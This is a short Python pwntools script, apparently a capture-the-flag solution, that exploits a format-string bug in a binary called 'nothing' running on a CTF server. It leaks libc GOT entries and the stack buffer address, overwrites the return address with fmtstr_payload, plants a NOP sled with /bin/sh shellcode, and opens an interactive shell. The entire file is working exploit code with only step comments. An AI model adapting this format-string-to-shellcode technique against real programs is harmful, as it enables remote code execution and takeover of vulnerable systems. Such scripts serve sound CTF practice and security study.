#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'

elf = ELF('nothing')

if args.REMOTE:
    p = remote('pwn02.chal.ctf.westerns.tokyo', 18247)
else:
    p = process(elf.path)

    if args.GDB:
        gdb.attach(p, '''
            break * 0x4007b5
            break * 0x4007c3
            continue
            ''')

# 1. Leak libc addresses

base = 6

payload = f'%{base+2}$s.%{base+3}$s.%{base+4}$s.'.encode() + p64(elf.got.puts) + p64(elf.got.printf) + p64(elf.got.setbuf)

p.sendafter(b'> ', payload)

puts_addr = u64(p.recvuntil(b'.')[:-1].ljust(8, b'\x00'))
printf_addr = u64(p.recvuntil(b'.')[:-1].ljust(8, b'\x00'))
setbuf_addr = u64(p.recvuntil(b'.')[:-1].ljust(8, b'\x00'))

log.info(f'puts @ {hex(puts_addr)}')
log.info(f'printf @ {hex(printf_addr)}')
log.info(f'setbuf @ {hex(setbuf_addr)}')

# 2. Leak buf address

payload = b'%p\n'

p.sendafter(b'> ', payload)

buf_addr = int(p.recvline(), 16)
ret_addr = buf_addr + 0x108
sc_addr = buf_addr + 0x80

log.info(f'buf @ {hex(buf_addr)}')
log.info(f'ret @ {hex(ret_addr)}')
log.info(f'sc @ {hex(sc_addr)}')

# 3. Overwrite ret with sc address

writes = {ret_addr: sc_addr}
payload = fmtstr_payload(6, writes)
sc = asm(shellcraft.amd64.linux.sh())

payload = payload + b'\x90' * (0x80 - len(payload)) + sc
p.sendafter(b'> ', payload)

# 4. Exit and get the shell

p.sendlineafter(b'> ', b'q')

p.interactive()
